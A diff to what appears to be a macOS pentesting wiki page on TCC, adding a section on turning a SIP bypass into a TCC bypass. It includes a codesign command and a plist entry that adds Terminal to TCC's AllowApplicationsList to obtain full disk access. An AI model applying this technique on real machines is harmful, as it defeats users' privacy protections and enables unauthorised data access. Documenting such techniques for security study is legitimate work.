@@ -141,6 +141,43 @@ Obtaining **write permissions** over the **user TCC** database you **can'**t gra
 
 But you can **can** give yourself **`Automation rights to Finder`, and since `Finder` has `FDA`, so do you.**
 
+### **From SIP Bypass to TCC Bypass**
+
+The **TCC databases** are protected by **SIP**, thats why only processes with the **indicated entitlements  are going to be able to modify** the databases. Therefore, if an attacker finds a **SIP bypass** over a **file** (be able to modify a file restricted by SIP), he will be able **remove the protection** of a TCC database, and give himself all TCC permissions.
+
+However, there is another option to abuse this **SIP bypass to bypass TCC**, the file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is an allow list of applications that require a TCC exception. Therefore, if an attacker can **remove the SIP protection** from this file and add his **own application** the application ill be able to bypass TCC.\
+For example to add terminal:
+
+```bash
+# Get needed info
+codesign -d -r- /System/Applications/Utilities/Terminal.app
+```
+
+AllowApplicationsList.plist:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Services</key>
+	<dict>
+		<key>SystemPolicyAllFiles</key>
+		<array>
+			<dict>
+				<key>CodeRequirement</key>
+				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
+				<key>IdentifierType</key>
+				<string>bundleID</string>
+				<key>Identifier</key>
+				<string>com.apple.Terminal</string>
+			</dict>
+		</array>
+	</dict>
+</dict>
+</plist>
+```
+
 ### TCC Signature Checks
 
 The TCC **database** stores the **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the App asking to use the a permission is the correct one.
